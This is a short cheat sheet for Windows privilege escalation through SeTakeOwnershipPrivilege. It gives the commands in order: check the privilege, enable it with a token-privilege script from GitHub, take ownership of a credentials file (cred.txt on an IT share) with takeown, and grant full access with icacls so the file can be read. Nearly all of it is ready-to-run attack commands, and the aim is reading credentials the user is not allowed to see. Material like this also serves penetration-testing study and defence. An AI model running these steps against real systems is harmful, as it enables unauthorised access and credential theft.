# SeTakeOwnershipPrivilege
With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, Remote Code Execution (RCE) or Denial-of-Service (DOS).

## Check Current User Privileges
```bash
whoami /priv
  SeTakeOwnershipPrivilege
``` 
```
if the privilege is disabled, enable it with this script :
https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
before read :
https://www.leeholmes.com/adjusting-token-privileges-in-powershell/

Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

##  Choosing a Target File
```
Get-ChildItem -Path 'C:\Department Shares\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
## Checking File Ownership
```
cmd /c dir /q 'C:\Department Shares\IT\'
```
## Taking Ownership of the File
```
takeown /f 'C:\Department Shares\IT\cred.txt'
```
##  Confirming Ownership Changed
```
Get-ChildItem -Path 'C:\Department Shares\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```
## Modifying the File ACL to read the file
```
icacls 'C:\Department Shares\IT\cred.txt' /grant username:F
```















